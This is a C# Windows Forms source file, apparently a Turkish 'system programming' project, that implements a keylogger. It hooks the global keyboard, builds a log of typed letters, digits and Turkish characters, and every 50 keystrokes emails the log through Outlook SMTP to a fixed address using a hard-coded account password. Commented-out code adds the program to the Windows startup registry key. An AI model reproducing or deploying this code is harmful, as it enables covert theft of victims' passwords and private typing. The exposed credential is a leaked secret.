using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using HootKeys;
using System.Net.Mail;
using System.Management;
using System.Diagnostics;

namespace WindowsFormsApp1
{
    public partial class SistemProgramlama : Form
    {
        public SistemProgramlama()
        {
            InitializeComponent();
            CallBoard();
        }
        #region DLL
        [DllImport("user32.dll")] //capslock
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        #endregion
        #region mail
        public void Mail()
        {

            MailMessage msj = new MailMessage();
            SmtpClient istemci = new SmtpClient();

            istemci.Credentials = new System.Net.NetworkCredential("atillasistemdeneme@outlook.com", "Atillasistem123");//IDPASS
            istemci.Port = 587;
            istemci.Host = "smtp-mail.outlook.com";
            istemci.EnableSsl = true;
            

            msj.Body = log.ToString();
            msj.Subject = "#Log";
            msj.From = new MailAddress("atillasistemdeneme@outlook.com");
            msj.To.Add("atilla@kku.edu.tr");

            istemci.Send(msj);


        }
       
        #endregion

        #region shutdown
        //void Shutdown2()
        //{
        //    const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        //    const short SE_PRIVILEGE_ENABLED = 2;
        //    const uint EWX_SHUTDOWN = 1;
        //    const short TOKEN_ADJUST_PRIVILEGES = 32;
        //    const short TOKEN_QUERY = 8;
        //    IntPtr hToken;
        //    TOKEN_PRIVILEGES tkp;

        //    // Bilgisayarı kapatmak için gerekli ayrıcalıklar.
        //    OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken);
        //    tkp.PrivilegeCount = 1;
        //    tkp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
        //    LookupPrivilegeValue("", SE_SHUTDOWN_NAME, out tkp.Privileges.pLuid);
        //    AdjustTokenPrivileges(hToken, false, ref tkp, 0U, IntPtr.Zero, IntPtr.Zero);
        //}

        //// API çağırma
        //private struct LUID
        //{
        //    public int LowPart;
        //    public int HighPart;
        //}
        //private struct LUID_AND_ATTRIBUTES
        //{
        //    public LUID pLuid;
        //    public int Attributes;
        //}
        //private struct TOKEN_PRIVILEGES
        //{
        //    public int PrivilegeCount;
        //    public LUID_AND_ATTRIBUTES Privileges;
        //}

        #endregion

        globalKeyboardHook klavye = new globalKeyboardHook();
        int resultPush;
        string log = string.Empty;
        bool capsLock = true;

        void CallBoard()
        {
            #region TUSLAR
            klavye.HookedKeys.Add(Keys.A);
            klavye.HookedKeys.Add(Keys.S);
            klavye.HookedKeys.Add(Keys.D);
            klavye.HookedKeys.Add(Keys.F);
            klavye.HookedKeys.Add(Keys.G);
            klavye.HookedKeys.Add(Keys.H);
            klavye.HookedKeys.Add(Keys.J);
            klavye.HookedKeys.Add(Keys.K);
            klavye.HookedKeys.Add(Keys.L);
            klavye.HookedKeys.Add(Keys.Z);
            klavye.HookedKeys.Add(Keys.X);
            klavye.HookedKeys.Add(Keys.C);
            klavye.HookedKeys.Add(Keys.V);
            klavye.HookedKeys.Add(Keys.B);
            klavye.HookedKeys.Add(Keys.N);
            klavye.HookedKeys.Add(Keys.M);
            klavye.HookedKeys.Add(Keys.Q);
            klavye.HookedKeys.Add(Keys.W);
            klavye.HookedKeys.Add(Keys.E);
            klavye.HookedKeys.Add(Keys.R);
            klavye.HookedKeys.Add(Keys.T);
            klavye.HookedKeys.Add(Keys.Y);
            klavye.HookedKeys.Add(Keys.U);
            klavye.HookedKeys.Add(Keys.I);
            klavye.HookedKeys.Add(Keys.O);
            klavye.HookedKeys.Add(Keys.P);
            //Türkçe Karekterler 
            klavye.HookedKeys.Add(Keys.OemOpenBrackets);
            klavye.HookedKeys.Add(Keys.Oem6);
            klavye.HookedKeys.Add(Keys.Oem1);
            klavye.HookedKeys.Add(Keys.Oem7);
            klavye.HookedKeys.Add(Keys.OemQuestion);
            klavye.HookedKeys.Add(Keys.Oem5);
            //
            //NÜMERİK
            klavye.HookedKeys.Add(Keys.NumPad0);
            klavye.HookedKeys.Add(Keys.NumPad1);
            klavye.HookedKeys.Add(Keys.NumPad2);
            klavye.HookedKeys.Add(Keys.NumPad3);
            klavye.HookedKeys.Add(Keys.NumPad4);
            klavye.HookedKeys.Add(Keys.NumPad5);
            klavye.HookedKeys.Add(Keys.NumPad6);
            klavye.HookedKeys.Add(Keys.NumPad7);
            klavye.HookedKeys.Add(Keys.NumPad8);
            klavye.HookedKeys.Add(Keys.NumPad9);
            klavye.HookedKeys.Add(Keys.D0);
            klavye.HookedKeys.Add(Keys.D1);
            klavye.HookedKeys.Add(Keys.D2);
            klavye.HookedKeys.Add(Keys.D3);
            klavye.HookedKeys.Add(Keys.D4);
            klavye.HookedKeys.Add(Keys.D5);
            klavye.HookedKeys.Add(Keys.D6);
            klavye.HookedKeys.Add(Keys.D7);
            klavye.HookedKeys.Add(Keys.D8);
            klavye.HookedKeys.Add(Keys.D9);
            //
            //nokta , backspace vs
            klavye.HookedKeys.Add(Keys.OemPeriod);
            klavye.HookedKeys.Add(Keys.Back);
            klavye.HookedKeys.Add(Keys.Space);
            klavye.HookedKeys.Add(Keys.Enter);
            klavye.HookedKeys.Add(Keys.CapsLock);
            klavye.HookedKeys.Add(Keys.CapsLock);
            #endregion
            klavye.KeyDown += new KeyEventHandler(keys);
        }

        private static int WM_QUERYENDSESSION = 0x11;
        private static bool systemShutdown = false;
        void keys(object sender,KeyEventArgs e)
        {
            
            if (resultPush>50)
            {
                Mail();
                resultPush = 0;
            }
            if (e.KeyCode==Keys.CapsLock)
            {
                if (capsLock) capsLock = false;
                else capsLock = true;
            }


            #region nokta , backspace, enter
            if (e.KeyCode == Keys.OemPeriod)
            {

                log += ".";
                resultPush++;
            }
            if (e.KeyCode == Keys.Back)
            {

                log += "*Back*";
                resultPush++;
            }
            if (e.KeyCode == Keys.Enter)
            {
                log += " -enter- ";
                resultPush++;
            }

            if (e.KeyCode == Keys.Space)
            {
                log += " ";
                resultPush++;
            }
            #endregion

            #region Rakamlar
            if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
            {

                log += "0";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.D1)
            {

                log += "1";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.D2)
            {

                log += "2";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.D3)
            {

                log += "3";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.D4)
            {

                log += "4";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.D5)
            {

                log += "5";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.D6)
            {

                log += "6";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.D7)
            {

                log += "7";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.D8)
            {

                log += "8";
                resultPush++;
            }
            if (e.KeyCode == Keys.NumPad9 || e.KeyCode == Keys.D9)
            {

                log += "9";
                resultPush++;
            }
            #endregion

            #region karakterler

            if (e.KeyCode == Keys.A)
            {
                if (capsLock == true)
                    log += "A";
                else
                    log += "a";

                resultPush++;
            }
            if (e.KeyCode == Keys.S)
            {
                if (capsLock == true)
                    log += "S";
                else
                    log += "s";

                resultPush++;
            }
            if (e.KeyCode == Keys.D)
            {
                if (capsLock == true)
                    log += "D";
                else
                    log += "d";

                resultPush++;
            }
            if (e.KeyCode == Keys.F)
            {

                if (capsLock == true)
                    log += "F";
                else
                    log += "f";

                resultPush++;
            }
            if (e.KeyCode == Keys.G)
            {

                if (capsLock == true)
                    log += "G";
                else
                    log += "g";

                resultPush++;
            }
            if (e.KeyCode == Keys.H)
            {

                if (capsLock == true)
                    log += "H";
                else
                    log += "h";

                resultPush++;
            }
            if (e.KeyCode == Keys.J)
            {

                if (capsLock == true)
                    log += "J";
                else
                    log += "j";

                resultPush++;
            }
            if (e.KeyCode == Keys.K)
            {

                if (capsLock == true)
                    log += "K";
                else
                    log += "k";

                resultPush++;

            }
            if (e.KeyCode == Keys.L)
            {

                if (capsLock == true)
                    log += "L";
                else
                    log += "l";

                resultPush++;
            }
            if (e.KeyCode == Keys.Z)
            {

                if (capsLock == true)
                    log += "Z";
                else
                    log += "z";

                resultPush++;
            }
            if (e.KeyCode == Keys.X)
            {

                if (capsLock == true)
                    log += "X";
                else
                    log += "x";

                resultPush++;
            }
            if (e.KeyCode == Keys.C)
            {

                if (capsLock == true)
                    log += "C";
                else
                    log += "c";

                resultPush++;
            }
            if (e.KeyCode == Keys.V)
            {

                if (capsLock == true)
                    log += "V";
                else
                    log += "v";

                resultPush++;
            }
            if (e.KeyCode == Keys.B)
            {

                if (capsLock == true)
                    log += "B";
                else
                    log += "b";

                resultPush++;
            }
            if (e.KeyCode == Keys.N)
            {

                if (capsLock == true)
                    log += "N";
                else
                    log += "n";

                resultPush++;
            }
            if (e.KeyCode == Keys.M)
            {

                if (capsLock == true)
                    log += "M";
                else
                    log += "m";

                resultPush++;

            }
            if (e.KeyCode == Keys.Q)
            {

                if (capsLock == true)
                    log += "Q";
                else
                    log += "q";

                resultPush++;
            }
            if (e.KeyCode == Keys.W)
            {

                if (capsLock == true)
                    log += "W";
                else
                    log += "w";

                resultPush++;
            }
            if (e.KeyCode == Keys.E)
            {

                if (capsLock == true)
                    log += "E";
                else
                    log += "e";

                resultPush++;
            }
            if (e.KeyCode == Keys.R)
            {

                if (capsLock == true)
                    log += "R";
                else
                    log += "r";

                resultPush++;
            }
            if (e.KeyCode == Keys.T)
            {

                if (capsLock == true)
                    log += "T";
                else
                    log += "t";

                resultPush++;
            }
            if (e.KeyCode == Keys.Y)
            {

                if (capsLock == true)
                    log += "Y";
                else
                    log += "y";

                resultPush++;
            }
            if (e.KeyCode == Keys.U)
            {

                if (capsLock == true)
                    log += "U";
                else
                    log += "u";

                resultPush++;
            }
            if (e.KeyCode == Keys.I)
            {

                if (capsLock == true)
                    log += "I";
                else
                    log += "ı";

                resultPush++;
            }
            if (e.KeyCode == Keys.O)
            {

                if (capsLock == true)
                    log += "O";
                else
                    log += "o";

                resultPush++;
            }
            if (e.KeyCode == Keys.P)
            {

                if (capsLock == true)
                    log += "P";
                else
                    log += "p";

                resultPush++;
            }
            if (e.KeyCode == Keys.OemOpenBrackets)
            {
                if (capsLock == true)
                    log += "Ğ";
                else
                    log += "ğ";

                resultPush++;
            }
            if (e.KeyCode == Keys.Oem6)
            {
                if (capsLock == true)
                    log += "Ü";
                else
                    log += "ü";

                resultPush++;
            }
            if (e.KeyCode == Keys.Oem1)
            {
                if (capsLock == true)
                    log += "Ş";
                else
                    log += "ş";

                resultPush++;
            }

            if (e.KeyCode == Keys.Oem7)
            {
                if (capsLock == true)
                    log += "İ";
                else
                    log += "i";

                resultPush++;
            }
            if (e.KeyCode == Keys.OemQuestion)
            {
                if (capsLock == true)
                    log += "Ö";
                else
                    log += "ö";

                resultPush++;
            }
            if (e.KeyCode == Keys.Oem5)
            {
                if (capsLock == true)
                    log += "Ç";
                else
                    log += "ç";
                resultPush++;
            }
            if (e.KeyCode == Keys.OemOpenBrackets)
            {
                if (capsLock == true)
                    log += "Ğ";
                else
                    log += "ğ";

                resultPush++;
            }
            if (e.KeyCode == Keys.Oem6)
            {
                if (capsLock == true)
                    log += "Ü";
                else
                    log += "ü";

                resultPush++;
            }
            if (e.KeyCode == Keys.Oem1)
            {
                if (capsLock == true)
                    log += "Ş";
                else
                    log += "ş";

                resultPush++;
            }

            if (e.KeyCode == Keys.Oem7)
            {
                if (capsLock == true)
                    log += "İ";
                else
                    log += "i";

                resultPush++;
            }
            if (e.KeyCode == Keys.OemQuestion)
            {
                if (capsLock == true)
                    log += "Ö";
                else
                    log += "ö";

                resultPush++;
            }
            if (e.KeyCode == Keys.Oem5)
            {
                if (capsLock == true)
                    log += "Ç";
                else
                    log += "ç";

                resultPush++;
            }
            #endregion
        }

        private void Form1_Click(object sender, EventArgs e)
        {
            MessageBox.Show(log.ToString());
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Control.IsKeyLocked(Keys.CapsLock)) capsLock = true; 
            else capsLock = false;
            /*#region başlangıçta da çalışmasını sağlama
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("SistemProgramlama", "\"" + Application.ExecutablePath + "\"");
            #endregion*/
        }
       
    }
}
